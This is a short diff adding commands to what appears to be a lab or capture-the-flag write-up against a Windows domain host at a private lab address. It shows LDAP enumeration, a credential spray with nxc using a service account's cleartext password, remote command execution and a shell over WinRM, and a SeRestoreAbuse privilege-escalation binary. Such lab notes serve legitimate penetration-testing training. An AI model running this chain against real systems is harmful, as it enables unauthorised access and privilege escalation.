@@ -5,19 +5,19 @@ ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://10.129.95.241" > ldapsearcho
 ```
 
 ```
-
+cd ~/Desktop/Tools/Windows && ./nxc-sweep 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
 ```
 
 ```
-
+nxc winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!' -x 'whoami /priv'
 ```
 
 ```
-
+evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
 ```
 
 ```
-
+.\SeRestoreAbuse.exe C:\Users\svc-printer\Desktop
 ```
 
 ```
